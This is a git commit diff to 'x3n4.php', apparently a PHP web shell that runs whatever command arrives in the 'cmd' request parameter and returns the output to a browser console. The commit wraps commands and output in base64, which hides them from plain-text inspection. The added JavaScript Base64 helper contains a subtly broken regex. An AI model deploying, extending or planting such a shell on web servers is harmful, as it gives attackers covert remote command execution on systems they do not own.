72318fd7f58e4a249d22c49077c07dec2503a025
David Tavarez <davidftavarez@gmail.com>
2018-06-26 13:17:17 -0400

    encoding commands

--- x3n4.php
+++ x3n4.php
@@ -126,8 +126,8 @@ if (isset($_REQUEST['cmd'])) {
         }
     }
 
-    $output = execute_command($_REQUEST['cmd'] . ' 2>&1');
-    output_json($output);
+    $output = execute_command(base64_decode($_REQUEST['cmd']) . ' 2>&1');
+    output_json(base64_encode($output));
 }
 
 /**
@@ -246,6 +246,9 @@ if (isset($_REQUEST['cmd'])) {
     <!-- Include all compiled plugins (below), or include individual files as needed -->
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <script>
+        // Create Base64 Object
+var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
+
         function x3n4 () {
             this.version = '<?php echo X3N4_VERSION; ?>';
             this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
@@ -254,12 +257,12 @@ if (isset($_REQUEST['cmd'])) {
                     $('#stdout').html('');
                     return;
                 }
+                command = Base64.encode(command);
                 $.post(this.script_path, {cmd: command}, function(data) {
-                    console.log(data);
                     if (data.stdout) {
-                        $('#stdout').append(data.banner + " " + command + "\n");
+                        $('#stdout').append(data.banner + " " + Base64.decode(command) + "\n");
                         if (data.stdout !== null) {
-                            $('#stdout').append(data.stdout);
+                            $('#stdout').append(Base64.decode(data.stdout));
                         }
                         $('#pwd').html(data.banner);
                     } else {
